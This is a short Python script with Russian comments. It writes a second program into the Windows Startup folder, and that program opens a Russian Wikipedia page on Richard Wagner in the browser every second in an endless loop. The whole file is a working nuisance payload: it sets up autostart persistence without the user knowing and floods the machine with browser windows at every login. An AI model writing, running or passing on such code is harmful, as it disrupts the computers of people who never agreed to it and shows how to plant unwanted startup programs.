import os
import shutil

program_content = """\
import webbrowser
import time
import schedule

url = "https://ru.wikipedia.org/wiki/%D0%92%D0%B0%D0%B3%D0%BD%D0%B5%D1%80,_%D0%A0%D0%B8%D1%85%D0%B0%D1%80%D0%B4"

# Функция для открытия ссылки
def open_link():
    webbrowser.open(url)

schedule.every(1).seconds.do(open_link)

while True:
    schedule.run_pending()
    time.sleep(1)
"""

startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")

program_path = os.path.join(startup_folder, "program.py")

with open(program_path, "w") as file:
    file.write(program_content)

print(f"program.py создан и добавлен в автозагрузку: {program_path}")
